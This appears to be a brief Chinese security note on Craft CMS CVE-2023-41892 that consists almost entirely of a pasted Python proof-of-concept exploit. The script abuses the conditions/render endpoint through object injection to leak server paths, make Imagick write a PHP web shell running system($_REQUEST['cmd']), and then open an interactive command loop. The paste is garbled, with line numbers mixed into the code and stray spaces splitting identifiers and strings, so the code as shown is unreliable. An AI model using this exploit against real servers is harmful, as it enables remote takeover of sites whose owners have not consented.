---
tags: [RCE, Craft CMS, CVE-2023-41892, Imagick利用, MSL]
---

# craftcms

CVE-2023-41892 gist上竟然有PoC

```
import  requests
2       import  re
3       import  sys 4
5       headers  =  {
6              "User-Agent " :  "Mozilla/5 .0  (Windows  NT  10 .0 ;  Win64 ;  x64)
AppleWebKit/537 .36  (KHTML ,  like  Gecko )  Chrome/107 .0 .5304 .88  Safari/537 .36 "
7       }
8
9      def  writePayloadToTempFile (documentRoot) : 10
11                data  =  {
12                         "action " :  "conditions/render " ,
13                         "configObject [class ] " :  "craft \elements\conditions\ElementCondition " , 14                         "config " :  ' { "name " : "configObject " , "as  " : {"class " : "Imagick " ,
"__construct() " : {"files " : "msl :/etc/passwd"}}} '
15                }
16
17                files  =  {
18                         "image1 " :  ("pwn1 .msl " ,  " " "<?xml  version= "1 .0 "  encoding= "UTF-8 "?>
19                         <image>
20                         < read  filename= "caption:&lt;?php  @system(@$_REQUEST [ 'cmd ' ]) ;  ?&gt ; " />
21                         <write  filename= "info :DOCUMENTROOT/cp resources/shell .php ">
22                       < /image> " " " . replace ( "DOCUMENTROOT " ,  documentRoot) ,   "text/plain")
23                }
24
25                response  =  requests .post(url ,  headers=headers ,  data=data ,  files=files) 26
27      def  getTmpUploadDi rAndDocumentRoot() :
28                data  =  {
29                         "action " :  "conditions/render " ,
30                         "configObject [class ] " :  "craft \elements\conditions\ElementCondition " , 31                         "config " :  r ' { "name " : "configObject " , "as  " :
{"class":"\\GuzzleHttp\\Psr7\\FnStream",  "__construct()":{"methods": {"close " : "phpinfo"}}}} '
32                }
33
34             response  =  requests .post(url ,  headers=headers ,  data=data)
35
36                pattern1  =  r '<tr><td  class= "e ">upload_tmp_dir< \/td><td  class= "v ">( .*?) < \/td><td  class= "v ">( .*?)<\/td><\/tr> '
37              pattern2  =  r '<tr><td  class= "e ">\$_SERVER\ [ \ 'DOCUMENT_ROOT\ ' \ ]<\/td><td class= "v ">([^<]+ )<\/td><\/tr> '
38
39      match1  =  re .search(pattern1 ,  response .text ,  re .DOTALL)
40             match2  =  re .search(pattern2 ,  response .text ,  re .DOTALL)
41                return  match1 .group(1 ) ,  match2 .group(1 ) 42
43       def  trigerImagick(tmpDir) :
44
45                data  =  {
46                         "action " :  "conditions/render " ,
47                         "configObject [class ] " :  "craft \elements\conditions\ElementCondition " , 48                         "config " :  ' { "name " : "configObject " , "as  " : {"class " : "Imagick " ,
"__construct() " : {"files " : "vid :msl : '  +  tmpDir  +  r ' /php*"}}} '
49                }
50             response  =  requests .post(url ,  headers=headers ,  data=data) 51
52       def  shell(cmd) :
53             response  =  requests .get(url  +  " /cp resources/shell .php " ,  params= {"cmd " : cmd})
54             match  =  re .search(r 'caption:( .*?)CAPTION ' ,  response .text ,  re .DOTALL) 55
56                if  match :
57                         extracted_text  =  match .group(1 ) .strip()
58                         print(extracted_text)
59                else :
60                      return  None
61                return  extracted_text
62
63       if  __name__  ==  "__main__ " :
64                if(len (sys .argv)   !=  2 ) :
65                         print("Usage :  python  CVE-2023-41892 .py  <url>")
66                         exit()
67                else :
68                         url  =  sys .argv [1 ]
69                         print( " [-]  Get  temporary  folder  and  document  root   . . . ")
70                         upload_tmp_dir ,  documentRoot  =  getTmpUploadDi rAndDocumentRoot()
71                         tmpDir  =  " /tmp "  if  "no  value "  in  upload_tmp_dir  else  upload_tmp_dir
72                         print( " [-]  Write  payload  to  temporary  file  . . . ")
73                         try :
74                                  writePayloadToTempFile (documentRoot)
75                         except  requests .exceptions .ConnectionError  as  e :
76                                  print( " [-]  Crash  the  php  process  and  write  temp  file successfully ")
77
78                         print( " [-]  Trigger  imagick  to  write  shell  . . . ")
79                         try :
80                                  trigerImagick(tmpDir)
81                         except :
82                               pass 83
84                         print( " [-]  Done ,  enjoy  the  shell")
85                         while  True :
86                                  cmd  =  input("$  ")
87                                  shell(cmd)
```

